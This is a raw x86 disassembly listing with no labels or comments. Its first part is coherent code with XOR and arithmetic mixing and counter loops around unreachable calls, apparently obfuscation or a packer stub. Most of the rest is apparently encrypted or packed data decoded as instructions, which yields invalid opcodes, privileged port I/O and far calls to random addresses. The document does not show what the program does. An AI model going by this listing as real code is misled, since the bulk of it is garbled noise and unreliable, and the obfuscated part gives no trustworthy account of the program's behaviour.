  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x65d67a6a
  4125d0:	push   cs
  4125d1:	add    al,0x18
  4125d3:	jae    0x412650
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	mov    ebp,0xad90762c
  4125df:	xor    DWORD PTR [ecx+0x2c263360],ebx
  4125e5:	ss xchg edx,eax
  4125e7:	and    BYTE PTR [ecx-0x397015f1],0xac
  4125ee:	ss out dx,al
  4125f0:	xor    DWORD PTR [ebx],edi
  4125f2:	imul   esi,DWORD PTR [ebp+0x36],0xd04f7326
  4125f9:	inc    esp
  4125fa:	or     BYTE PTR [eax+0x1fccbad4],al
  412600:	jnp    0x412622
  412602:	mov    esi,0xd3b93ef9
  412607:	outs   dx,DWORD PTR ds:[esi]
  412608:	fcomi  st,st(4)
  41260a:	add    dl,BYTE PTR [ebx]
  41260c:	pop    es
  41260d:	mov    dh,0x4
  41260f:	lods   eax,DWORD PTR ds:[esi]
  412610:	hlt    
  412611:	imul   edx,eax,0x37e97566
  412617:	sbb    eax,0x7e722b9c
  41261c:	add    al,BYTE PTR ds:[eax-0x23]
  412620:	or     DWORD PTR [ebx+eax*4],ebp
  412623:	inc    esp
  412624:	sbb    al,ch
  412626:	pop    edx
  412627:	mov    esp,?
  412629:	sbb    bl,BYTE PTR [ecx+0x476b5e5c]
  41262f:	stos   BYTE PTR es:[edi],al
  412630:	inc    esi
  412631:	push   esi
  412632:	sub    al,dl
  412634:	dec    esp
  412635:	lods   al,BYTE PTR ds:[esi]
  412636:	inc    esi
  412637:	sub    edx,DWORD PTR [esp+ebp*2-0x68cbede5]
  41263e:	xchg   ecx,eax
  41263f:	in     eax,dx
  412640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412641:	push   ebp
  412642:	mov    ecx,0x6374e5d8
  412647:	sbb    eax,0xa282a4f5
  41264c:	daa    
  41264d:	cmp    cl,ah
  41264f:	popf   
  412650:	ins    BYTE PTR es:[edi],dx
  412651:	pop    edi
  412652:	sub    edx,DWORD PTR [esi-0x38d1a970]
  412658:	es jbe 0x412638
  41265b:	dec    edx
  41265c:	into   
  41265d:	sti    
  41265e:	pop    edi
  41265f:	push   eax
  412660:	xchg   cl,cl
  412662:	cmp    edi,esi
  412664:	jbe    0x412625
  412666:	ror    BYTE PTR [ebp+0x7b],1
  412669:	retf   
  41266a:	jge    0x412602
  41266c:	mov    cl,0x21
  41266e:	scas   eax,DWORD PTR es:[edi]
  41266f:	xor    DWORD PTR [ecx+edi*4],ecx
  412672:	dec    ebp
  412673:	mov    al,BYTE PTR [edi+0x5a11cafc]
  412679:	out    dx,al
  41267a:	outs   dx,DWORD PTR ds:[esi]
  41267b:	test   edi,eax
  41267d:	or     edx,DWORD PTR [eax-0x31614025]
  412683:	arpl   si,sp
  412685:	leave  
  412686:	add    bl,0x5
  412689:	cmc    
  41268a:	xor    ch,BYTE PTR [ebp+0x1ca580b8]
  412690:	inc    ecx
  412691:	adc    al,0x4b
  412693:	add    DWORD PTR [edi+0x5fc2477],edx
  412699:	addr16 or al,0xa
  41269c:	test   BYTE PTR [ecx-0x671edff4],bl
  4126a2:	inc    eax
  4126a3:	sub    DWORD PTR [edx+0x41],eax
  4126a6:	mov    dh,0x52
  4126a8:	cmc    
  4126a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126aa:	fwait
  4126ab:	ja     0x4126c9
  4126ad:	pop    es
  4126ae:	ins    DWORD PTR es:[edi],dx
  4126af:	movd   mm3,esi
  4126b2:	into   
  4126b3:	call   0x7abe:0xd15172a7
  4126ba:	mov    bl,0xb
  4126bc:	sub    BYTE PTR [ebp+0x28],bl
  4126bf:	ins    DWORD PTR es:[edi],dx
  4126c0:	in     eax,dx
  4126c1:	pop    ss
  4126c2:	out    0x9,eax
  4126c4:	(bad)  
  4126c5:	mov    edi,0x7c7d628c
  4126ca:	(bad)  
  4126cb:	adc    esp,DWORD PTR [esi+0x26]
  4126ce:	xchg   edx,eax
  4126cf:	not    BYTE PTR [ebx]
  4126d1:	loop   0x4126ac
  4126d3:	fdivr  DWORD PTR [ebx-0x22]
  4126d6:	mov    ebp,0x38449007
  4126db:	mov    ds:0x43596c0,al
  4126e0:	add    ecx,edx
  4126e2:	adc    al,0x9e
  4126e4:	mov    bh,0xcd
  4126e6:	inc    edi
  4126e7:	sbb    al,0x8f
  4126e9:	sahf   
  4126ea:	fstp   DWORD PTR [ebx-0x7c]
  4126ed:	dec    edx
  4126ee:	lods   al,BYTE PTR ds:[esi]
  4126ef:	inc    edx
  4126f0:	or     al,0x35
  4126f2:	push   ecx
  4126f3:	inc    esi
  4126f4:	in     eax,dx
  4126f5:	test   BYTE PTR [eax+0x77],dh
  4126f8:	or     BYTE PTR [esi+0x37],bh
  4126fb:	enter  0x2ea3,0x3e
  4126ff:	jno    0x41271d
  412701:	xchg   ecx,eax
  412702:	or     ebx,DWORD PTR [ebp+edx*2-0x5c4b179a]
  412709:	jb     0x412725
  41270b:	or     BYTE PTR fs:[ecx+eax*8+0x66],bl
  412710:	xchg   BYTE PTR [eax-0x54],cl
  412713:	and    BYTE PTR [eax],ah
  412715:	repnz xor al,0x8d
  412718:	fwait
  412719:	lods   eax,DWORD PTR ds:[esi]
  41271a:	sbb    bh,al
  41271c:	cmp    BYTE PTR [ebx+0x7933263c],0x90
  412723:	stos   DWORD PTR es:[edi],eax
  412724:	mov    al,ds:0xce0dfea0
  412729:	pop    ecx
  41272a:	inc    eax
  41272b:	popf   
  41272c:	scas   eax,DWORD PTR es:[edi]
  41272d:	scas   al,BYTE PTR es:[edi]
  41272e:	mov    edi,0xfd5f6987
  412733:	scas   al,BYTE PTR es:[edi]
  412734:	xchg   esp,eax
  412735:	(bad)  
  412737:	mov    ch,0x2a
  412739:	xchg   edi,eax
  41273a:	ffree  st(0)
  41273c:	aad    0x0
  41273e:	sbb    eax,0x94a3eeef
  412743:	mov    cl,0x4
  412745:	and    BYTE PTR [esi+0x3b],ch
  412748:	outs   dx,DWORD PTR ds:[esi]
  412749:	adc    DWORD PTR [ecx+0x336c02f6],eax
  41274f:	xor    eax,0xfaae9d3b
  412754:	sti    
  412755:	xchg   esi,eax
  412756:	stc    
  412757:	repz mov ebp,0xf543f9bb
  41275d:	mov    al,0xf3
  41275f:	mov    eax,ds:0x618e6d84
  412764:	lods   al,BYTE PTR ds:[esi]
  412765:	test   BYTE PTR [ebx-0x1f36998d],0x4d
  41276c:	aaa    
  41276d:	repnz mov esp,0xa9dff5b3
  412773:	cmp    esi,DWORD PTR es:[ecx-0x72]
  412777:	sub    dh,BYTE PTR [esi-0x11]
  41277a:	dec    edi
  41277b:	shl    DWORD PTR [esi*8-0x49987fdd],1
  412782:	inc    ebp
  412783:	add    DWORD PTR [edx-0x441266c0],ecx
  412789:	xor    al,0x6a
  41278b:	sub    eax,0x2f57aed9
  412790:	leave  
  412791:	mov    esi,0x248fa678
  412796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412797:	cmp    DWORD PTR [eax-0x6b],edx
  41279a:	dec    esp
  41279b:	push   DWORD PTR [ecx-0x17a21522]
  4127a1:	js     0x412726
  4127a3:	(bad)  
  4127a5:	pop    ecx
  4127a6:	mov    eax,0x2ac34ba0
  4127ab:	or     eax,0x39b1f764
  4127b0:	cmp    eax,DWORD PTR [ebx-0x1e]
  4127b3:	push   edi
  4127b4:	dec    esp
  4127b5:	xor    al,0x41
  4127b7:	push   ecx
  4127b8:	sub    BYTE PTR [esi+0x279dd7c2],dl
  4127be:	mov    bl,0x70
  4127c0:	out    0x4c,eax
  4127c2:	jb     0x41277e
  4127c4:	dec    edx
  4127c5:	xor    DWORD PTR ds:0x83ef4829,ebp
  4127cb:	shrd   DWORD PTR [eax],ecx,0xd8
  4127cf:	push   ecx
  4127d0:	fnstcw WORD PTR [eax-0x52fbb447]
  4127d6:	fsub   st(0),st
  4127d8:	lea    ebx,[edi+esi*1+0x7]
  4127dc:	scas   al,BYTE PTR es:[edi]
  4127dd:	xor    eax,0xdd9da227
  4127e2:	into   
  4127e3:	mov    esi,0x80310018
  4127e8:	mov    dl,0x77
  4127ea:	push   ebx
  4127eb:	mov    eax,ds:0x15cfabb9
  4127f0:	pop    edi
  4127f1:	iret   
  4127f2:	adc    eax,0x1c7a4f72
  4127f7:	rcl    edx,cl
  4127f9:	pop    edi
  4127fa:	in     al,0x7c
  4127fc:	mov    ebx,0x1035da7b
  412801:	ja     0x4127d1
  412803:	dec    edx
  412804:	out    0xa8,al
  412806:	daa    
  412807:	push   esp
  412808:	sbb    al,ah
  41280a:	int    0xdb
  41280c:	mov    esi,0x1f78f42c
  412811:	mov    eax,0xf16b9483
  412816:	inc    ebx
  412817:	sbb    DWORD PTR [edi],edi
  412819:	adc    dl,BYTE PTR [edx-0x2c]
  41281c:	test   BYTE PTR [eax],cl
  41281e:	aaa    
  41281f:	sbb    esi,DWORD PTR cs:[ebp+0xec9627b]
  412826:	aas    
  412827:	retf   0x4280
  41282a:	jne    0x41282a
  41282c:	fbstp  TBYTE PTR [esp+ebp*4]
  41282f:	sub    esp,DWORD PTR [ebx]
  412831:	mov    esp,0x78d6a34
  412836:	aas    
  412837:	jmp    0x412833
  412839:	xchg   DWORD PTR [esi-0x2e39b65f],esp
  41283f:	push   ss
  412840:	xlat   BYTE PTR ds:[ebx]
  412841:	mov    eax,0xf3c7f8cc
  412846:	jae    0x412891
  412848:	std    
  412849:	sub    bh,bl
  41284b:	inc    ebx
  41284c:	mov    ah,0xa4
  41284e:	jle    0x412828
  412850:	ss jno 0x4128b3
  412853:	mov    BYTE PTR [ebx-0x71],dh
  412856:	sub    eax,0x1408853d
  41285b:	add    al,BYTE PTR [eax-0x46]
  41285e:	bnd jl 0x4128af
  412861:	sub    al,0x10
  412863:	aaa    
  412864:	popf   
  412865:	adc    eax,0x7218975f
  41286a:	inc    ecx
  41286b:	ret    0x745b
  41286e:	jl     0x412802
  412870:	mov    BYTE PTR [ebx-0x3bab2d67],0x38
  412877:	ja     0x412813
  412879:	stos   BYTE PTR es:[edi],al
  41287a:	mov    ah,0xb5
  41287c:	and    eax,0x851090e2
  412881:	lods   al,BYTE PTR ds:[esi]
  412882:	xchg   BYTE PTR [bp+0x1ec],cl
  412887:	(bad)  
  412888:	and    esi,DWORD PTR [ebp+edx*2-0x48ca42ee]
  41288f:	loopne 0x4128b3
  412891:	add    al,0xd4
  412893:	mov    bh,0xc5
  412895:	ins    DWORD PTR es:[edi],dx
  412896:	mov    ds,WORD PTR [esi+0x68]
  412899:	sbb    DWORD PTR [esi+0x18],0xc4cb946e
  4128a0:	xchg   ecx,eax
  4128a1:	push   esi
  4128a2:	and    ebx,0x45242c12
  4128a8:	outs   dx,BYTE PTR ds:[esi]
  4128a9:	sar    DWORD PTR [edx+0x49c15824],cl
  4128af:	cmp    ebp,DWORD PTR [edi+0x50257240]
  4128b5:	div    edx
  4128b7:	aam    0x16
  4128b9:	clc    
  4128ba:	push   edi
  4128bb:	mov    ?,WORD PTR [eax+eax*1-0x5685f49c]
  4128c2:	mov    cl,0xbf
  4128c4:	mov    ds:0x2f7da1d2,al
  4128c9:	lock dec ebx
  4128cb:	mov    esp,DWORD PTR [ebp+0x22]
  4128ce:	mov    al,BYTE PTR [edx+edx*4+0x715eba9c]
  4128d5:	push   ecx
  4128d6:	push   edx
  4128d7:	sbb    BYTE PTR ds:0x2cce3aea,0xeb
  4128de:	mov    gs,WORD PTR [esi]
  4128e0:	mov    ss,ebx
  4128e2:	add    BYTE PTR [edi],0x15
  4128e5:	mov    dl,0xb8
  4128e7:	js     0x4128b1
  4128e9:	mov    eax,ds:0xd97f3a50
  4128ee:	outs   dx,BYTE PTR ds:[esi]
  4128ef:	hlt    
  4128f0:	popf   
  4128f1:	xchg   esi,eax
  4128f2:	mov    edi,0x73a59e87
  4128f7:	retf   0xe925
  4128fa:	test   dh,ch
  4128fc:	arpl   WORD PTR [eax-0x63e2f0ed],si
  412902:	cld    
  412903:	dec    ebx
  412904:	mov    al,0x37
  412906:	adc    cl,BYTE PTR [esi+ebp*2-0x4c]
  41290a:	ss pop ecx
  41290c:	addr16 fcmovnu st,st(5)
  41290f:	jmp    0x9ce1f308
  412914:	cld    
  412915:	jns    0x412992
  412917:	mov    edi,0xc2a43553
  41291c:	int    0x7
  41291e:	sub    al,BYTE PTR [edx+0x7e3009ea]
  412924:	retf   
  412925:	push   ebp
  412926:	daa    
  412927:	out    0x4d,al
  412929:	jmp    0x4ac4878d
  41292e:	fnstenv [edx]
  412930:	in     al,0xaf
  412932:	cmp    BYTE PTR [esi-0x42],cl
  412935:	cwde   
  412936:	pop    eax
  412937:	and    eax,DWORD PTR [edi]
  412939:	mov    bh,0x91
  41293b:	jo     0x412965
  41293d:	inc    ebx
  41293e:	shl    DWORD PTR [esi-0xc9901e4],0xe4
  412945:	mov    eax,ds:0xe2e565f7
  41294a:	hlt    
  41294b:	sub    eax,DWORD PTR [edi]
  41294d:	das    
  41294e:	push   edx
  41294f:	pop    ds
  412950:	int    0x4
  412952:	mov    bl,0xa0
  412954:	and    dl,BYTE PTR [eax]
  412956:	add    DWORD PTR [ebx],0x957c8a4e
  41295c:	inc    edx
  41295d:	sbb    al,BYTE PTR [esi]
  41295f:	lods   al,BYTE PTR ds:[esi]
  412960:	iret   
  412961:	mov    eax,0xd5e9d65a
  412966:	xchg   ebp,eax
  412967:	stos   BYTE PTR es:[edi],al
  412968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412969:	jo     0x41290d
  41296b:	add    al,0x13
  41296d:	push   ecx
  41296e:	int    0x72
  412970:	mov    al,ds:0xcfe43e69
  412975:	mov    ch,0xb2
  412977:	sbb    BYTE PTR [eax+0x6d],0x8b
  41297b:	push   eax
  41297c:	mov    dl,0xf0
  41297f:	jns    0x4129b0
  412981:	mov    ebx,0xca978a4e
  412986:	push   ebx
  412987:	loope  0x412951
  412989:	rcr    DWORD PTR [ebx-0x2b],cl
  41298c:	es dec edi
  41298e:	add    eax,0x3ffe07ad
  412993:	jb     0x41298e
  412995:	mov    ds:0x55b0b329,eax
  41299a:	out    dx,eax
  41299b:	repnz les ebx,FWORD PTR [ebx+0x1901a871]
  4129a2:	je     0x412a15
  4129a4:	aad    0xe4
  4129a6:	adc    cl,BYTE PTR [ebx+0x78]
  4129a9:	mov    ecx,0x714d7354
  4129ae:	call   0xabe11367
  4129b3:	(bad)  
  4129b4:	(bad)  
  4129b6:	ds xchg esp,eax
  4129b8:	mov    dh,0x8d
  4129ba:	in     al,0x73
  4129bc:	sbb    eax,0xb722e9bd
  4129c1:	dec    ecx
  4129c2:	mov    dh,BYTE PTR [ebx]
  4129c4:	aas    
  4129c5:	popf   
  4129c6:	and    cl,al
  4129c8:	mov    BYTE PTR [ebp+ebx*4-0x7f],0x1b
  4129cd:	sub    ah,bl
  4129cf:	pop    es
  4129d0:	mov    ecx,0xc7f86b3a
  4129d5:	ins    BYTE PTR es:[edi],dx
  4129d6:	mov    edi,0xc45a25ff
  4129db:	in     al,0xb9
  4129dd:	adc    BYTE PTR ds:0xffa70673,bl
  4129e3:	or     ch,BYTE PTR [esi+0x5a14996]
  4129e9:	into   
  4129ea:	fiadd  WORD PTR [ebx-0x525b5b79]
  4129f0:	(bad)  
  4129f2:	mov    eax,ds:0x6a7db2
  4129f7:	lods   al,BYTE PTR ds:[esi]
  4129f8:	in     al,dx
  4129f9:	lds    ebp,FWORD PTR [ebx+edi*1-0x5221992d]
  412a00:	ret    0xe41c
  412a03:	and    ebx,ebp
  412a05:	daa    
  412a06:	add    dh,bh
  412a08:	xchg   ecx,eax
  412a09:	sbb    eax,0xd5081a91
  412a0e:	dec    edx
  412a0f:	mov    edx,0xdc012b3f
  412a14:	add    BYTE PTR [ecx-0x42],al
  412a17:	out    dx,eax
  412a18:	enter  0xc238,0x3d
  412a1c:	aas    
  412a1d:	inc    esp
  412a1e:	sti    
  412a1f:	push   ebx
  412a20:	push   ss
  412a21:	std    
  412a22:	pop    esi
  412a23:	pop    ss
  412a24:	neg    DWORD PTR [esi]
  412a26:	cmp    eax,ecx
  412a28:	retf   0x1d50
  412a2b:	and    al,0xbf
  412a2d:	out    0x9d,eax
  412a2f:	in     eax,0xf3
  412a31:	daa    
  412a32:	jmp    0x780c:0x56baff30
  412a39:	fs jmp 0x412a72
  412a3c:	mov    ds:0xc0c16e38,ax
  412a42:	fadd   st(1),st
  412a44:	repnz sub cl,al
  412a47:	fadd   DWORD PTR [ebx]
  412a49:	jg     0x412a16
  412a4b:	xchg   DWORD PTR [edi+0x1d58b41f],esi
  412a51:	jbe    0x412aa0
  412a53:	ds repz sbb ah,BYTE PTR gs:[ebp+0x62a653b4]
  412a5c:	push   edi
  412a5d:	inc    edx
  412a5e:	add    eax,DWORD PTR [ebx+0x79]
  412a61:	dec    ecx
  412a62:	repz mov al,BYTE PTR [esi+0x49]
  412a66:	call   0x82073b32
  412a6b:	sbb    bl,ch
  412a6d:	pop    esp
  412a6e:	pop    ecx
  412a6f:	retf   0x43ae
  412a72:	pop    ebx
  412a73:	out    dx,al
  412a74:	jl     0x412a4c
  412a76:	sahf   
  412a77:	push   0xfffffff0
  412a79:	sti    
  412a7a:	retf   0xa35
  412a7d:	hlt    
  412a7e:	mov    ds:0x42fb775f,al
  412a83:	lds    ebp,FWORD PTR [edx+0x6f]
  412a86:	push   esp
  412a87:	(bad)  
  412a88:	hlt    
  412a89:	icebp  
  412a8a:	test   al,0x68
  412a8c:	(bad)  
  412a8d:	add    BYTE PTR [edi],bl
  412a8f:	fs sbb dh,ch
  412a92:	mov    al,ds:0x82ccc9a6
  412a97:	hlt    
  412a98:	xchg   ecx,eax
  412a99:	cmp    DWORD PTR ds:0x6a1c285c,0xe437c175
  412aa3:	out    0x65,eax
  412aa5:	movhps QWORD PTR [eax+0x30603c14],xmm1
  412aac:	mov    gs,WORD PTR [ecx]
  412aae:	(bad)  
  412aaf:	and    al,ah
  412ab1:	call   0x89aa:0xf318aee1
  412ab8:	repz fdivr st,st(6)
  412abb:	(bad)  
  412abd:	test   esi,ebx
  412abf:	scas   al,BYTE PTR es:[edi]
  412ac0:	jmp    FWORD PTR [edx+0x45]
  412ac3:	pushf  
  412ac4:	mov    eax,ds:0x8cd24eb2
  412ac9:	xchg   esp,eax
  412aca:	test   al,0x85
  412acc:	mov    gs,WORD PTR [edx+0x2502c168]
  412ad2:	neg    DWORD PTR [ebx-0x4fcd9e48]
  412ad8:	inc    eax
  412ad9:	mov    ebp,0x51e33a05
  412ade:	in     al,0xc7
  412ae0:	sbb    dh,ah
  412ae2:	lods   al,BYTE PTR ds:[esi]
  412ae3:	push   ebp
  412ae4:	lock popa 
  412ae6:	dec    esi
  412ae7:	push   0xee7b122e
  412aec:	gs cmc 
  412aee:	mov    WORD PTR [ecx-0x603a3148],gs
  412af4:	cmp    eax,esp
  412af6:	aaa    
  412af7:	je     0x412b61
  412af9:	call   0xfc24:0x7d0dc56d
  412b00:	inc    bp
  412b02:	fidivr WORD PTR [eax]
  412b04:	scas   al,BYTE PTR es:[edi]
  412b05:	stos   DWORD PTR es:[edi],eax
  412b06:	mov    eax,ds:0x8ecd9ff3
  412b0b:	(bad)  
  412b0c:	cld    
  412b0d:	fwait
  412b0e:	lahf   
  412b0f:	and    al,0x32
  412b11:	dec    ebx
  412b12:	and    ah,BYTE PTR ds:0x7e1684f5
  412b18:	add    DWORD PTR [ebx+0x248f58a9],edi
  412b1e:	cmc    
  412b1f:	push   cs
  412b20:	sub    BYTE PTR [edi-0x7d],cl
  412b23:	add    BYTE PTR [ecx+edx*2+0x723e005e],0xff
  412b2b:	cld    
  412b2c:	retw   
  412b2e:	sbb    BYTE PTR [edx+0x40],ch
  412b31:	add    eax,0x7769e364
  412b36:	push   ebx
  412b37:	shl    DWORD PTR [esi+edi*2-0x5c],0x48
  412b3c:	scas   eax,DWORD PTR es:[edi]
  412b3d:	mov    dl,0x2
  412b3f:	and    ebp,DWORD PTR [eax]
  412b41:	fsub   DWORD PTR [ebp+edi*1-0x427acf78]
  412b48:	in     al,0x46
  412b4a:	mov    ss,ebx
  412b4c:	inc    edi
  412b4d:	jno    0x412b62
  412b4f:	rcl    DWORD PTR [ecx-0x407e2e28],0xf7
  412b56:	iret   
  412b57:	pop    ebx
  412b58:	adc    BYTE PTR [ebx-0x29ba4341],ch
  412b5e:	cmp    al,0x63
  412b60:	mov    edx,0xd0e111f8
  412b65:	adc    al,BYTE PTR [eax-0x59]
  412b68:	rol    BYTE PTR [edi-0xa3afab8],0x88
  412b6f:	loopne 0x412be0
  412b71:	lods   al,BYTE PTR ds:[esi]
  412b72:	(bad)  
  412b73:	call   0xd4b:0x85e613fd
  412b7a:	fwait
  412b7b:	lock add BYTE PTR [edx-0x714f7fce],al
  412b82:	cmp    DWORD PTR [ecx+ebp*8],ebp
  412b85:	iret   
  412b86:	in     eax,dx
  412b87:	fstp   DWORD PTR [eax]
  412b89:	add    eax,0x472fdf18
  412b8e:	jns    0x412b68
  412b90:	mov    eax,0xb88046ad
  412b95:	cmp    BYTE PTR [ecx],bh
  412b97:	lods   eax,DWORD PTR ds:[esi]
  412b98:	mov    edi,0x38e48bfc
  412b9d:	out    dx,eax
  412b9e:	mov    eax,0x46d1a98
  412ba3:	ss adc eax,0x6f19bef9
  412ba9:	into   
  412baa:	mov    ds:0x6610f205,eax
  412baf:	jne    0x412b5d
  412bb1:	jae    0x412bca
  412bb3:	pop    edi
  412bb4:	jmp    0x412b66
  412bb6:	mov    esp,0xf9e7c2e4
  412bbb:	xchg   ebp,eax
  412bbc:	stc    
  412bbd:	mov    dl,0x70
  412bbf:	enter  0x3ebd,0x85
  412bc3:	cmp    eax,ebp
  412bc5:	sbb    BYTE PTR [edx+0x9c9559a],0x90
  412bcc:	or     al,0x37
  412bce:	push   ss
  412bcf:	and    ebx,DWORD PTR [ebx]
  412bd1:	dec    ebp
  412bd2:	sti    
  412bd3:	and    ch,ah
  412bd5:	sbb    dh,al
  412bd7:	rcr    DWORD PTR [ebp+0x1c],1
  412bda:	and    eax,0x8b2bc8cf
  412bdf:	mov    bh,0x36
  412be1:	gs test eax,0xb69351e0
  412be7:	push   esi
  412be8:	call   0x754:0xbc3b6c31
  412bef:	mov    ds:0xeef469e9,eax
  412bf4:	and    dl,ah
  412bf6:	mov    ch,0xf9
  412bf8:	shl    BYTE PTR [edx],1
  412bfa:	sub    al,0x2f
  412bfc:	xor    DWORD PTR [edi+0x5e],0x46
  412c00:	and    ebx,DWORD PTR [ebp+0x11112e8a]
  412c06:	bound  ecx,QWORD PTR [edx-0x4ff87bbc]
  412c0c:	add    ch,ch
  412c0e:	sbb    eax,0x397bdc2f
  412c13:	xor    esi,DWORD PTR [edx+0x3d]
  412c16:	jb     0x412ba0
  412c18:	mov    ah,0x90
  412c1a:	sub    BYTE PTR [edi-0x656f5cd6],bl
  412c20:	call   0xdf984c0
  412c25:	jbe    0x412c0e
  412c27:	clc    
  412c28:	cmp    esp,DWORD PTR [ebx+0x5f8093de]
  412c2e:	call   0xc7b5:0x62d29ee4
  412c35:	sti    
  412c36:	add    DWORD PTR [edi],ebp
  412c38:	jmp    0x412bc2
  412c3a:	pushf  
  412c3b:	nop
  412c3c:	xchg   edi,eax
  412c3d:	loopne 0x412c60
  412c3f:	jbe    0x412c0c
  412c41:	sub    al,0xb3
  412c43:	xlat   BYTE PTR ss:[ebx]
  412c45:	or     DWORD PTR [esi+eax*4-0xc34c0f5],eax
  412c4c:	in     al,0xde
  412c4e:	sbb    DWORD PTR [ebx-0x6db276b8],esi
  412c54:	add    esp,DWORD PTR [edi-0x373a1441]
  412c5a:	fcmovu st,st(0)
  412c5c:	add    al,0x67
  412c5e:	jmp    0x9393:0x43901365
  412c65:	add    DWORD PTR [ebx+0x1bbf0107],ebp
  412c6b:	(bad)  
  412c6c:	out    0x19,al
  412c6e:	arpl   WORD PTR [edx-0x62],cx
  412c71:	jae    0x412c5c
  412c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c74:	ret    
  412c75:	js     0x412cb3
  412c77:	arpl   WORD PTR [eax],sp
